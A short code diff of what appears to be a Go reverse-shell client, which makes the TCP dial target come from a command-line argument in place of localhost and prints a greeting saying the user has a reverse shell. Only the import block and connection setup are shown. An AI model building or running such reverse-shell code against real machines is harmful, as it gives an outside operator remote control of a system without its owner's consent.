@@ -1,10 +1,14 @@
 package main
 
-import "net"
-import "fmt"
-import "bufio"
-import "strings"
-import "github.com/GoPotUrself/shell"
+import (
+	"bufio"
+	"fmt"
+	"net"
+	"os"
+	"strings"
+
+	"github.com/GoPotUrself/shell"
+)
 
 /*
 So a few floating things here:
@@ -19,7 +23,8 @@ So a few floating things here:
 func main() {
 
 	//connect to this socket
-	conn, _ := net.Dial("tcp", "127.0.0.1:8080")
+	address := os.Args[1] + ":8080"
+	conn, _ := net.Dial("tcp", address)
 
 	//read in input from stdin
 	output := "Hi, yes, hello, You have a reverse shell MY dude"
